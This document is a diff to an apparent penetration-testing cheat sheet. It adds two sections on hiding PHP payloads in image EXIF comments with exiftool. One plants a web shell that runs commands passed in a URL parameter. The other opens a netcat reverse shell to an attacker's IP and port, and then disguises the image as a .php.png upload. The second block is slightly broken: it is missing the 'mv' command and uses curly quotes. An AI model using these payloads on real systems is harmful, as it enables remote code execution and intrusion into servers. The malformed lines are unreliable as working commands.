@@ -7,6 +7,7 @@
   * [<kbd>Netcat Windows</kbd>](#Netcat-Windows)
   * [<kbd>Netcat URL Encoding</kbd>](#Netcat-URL-Encoding)
 - [<kbd>WebShell</kbd>](#WebShell)
+  * [<kbd>Exif Data</kbd>](#Exif-Data)
   * [<kbd>ASP WebShell</kbd>](#ASP-WebShell)
   * [<kbd>PHP WebShell</kbd>](#PHP-WebShell)
   * [<kbd>Log Poisoning WebShell</kbd>](#Log-Poisoning-WebShell)
@@ -15,6 +16,7 @@
       * [<kbd>HTTP</kbd>](#Log-Poisoning-HTTP)
 - [<kbd>Server Side Template Injection (SSTI)</kbd>](#Server-Side-Template-Injection)
 - [<kbd>UnrealIRCd</kbd>](#UnrealIRCd)
+- [<kbd>Exif Data</kbd>](#Exif-Data-Reverse-Shell)
 - [<kbd>Shellshock</kbd>](#Shellshock)
   * [<kbd>SSH</kbd>](#Shellshock-SSH)
   * [<kbd>HTTP</kbd>](#Shellshock-HTTP)
@@ -110,7 +112,14 @@
   ---
   
   # <kbd>WebShell</kbd>
-  
+ 
+  # <kbd>Exif Data</kbd>
+ 
+  ```cmd
+  root@kali:~# exiftool -Comment='<?php system($_GET['cmd']); ?>' filename.png
+  root@kali:~# mv filename.png filename.php.png
+  ```
+ 
   # <kbd>ASP WebShell</kbd>
   
   ```asp
@@ -200,7 +209,16 @@
   ```
  
   ---
- 
+  
+  # <kbd>Exif Data Reverse Shell</kbd>
+   
+  ```cmd
+  root@kali:~# exiftool -Comment='<?php system(“nc <YourIP> <YourPort> -e /bin/bash”); ?>' filename.png
+  root@kali:~# filename.png filename.php.png
+  ```
+   
+  ---
+   
   # <kbd>Shellshock</kbd>
   
   # <kbd>Shellshock SSH</kbd>
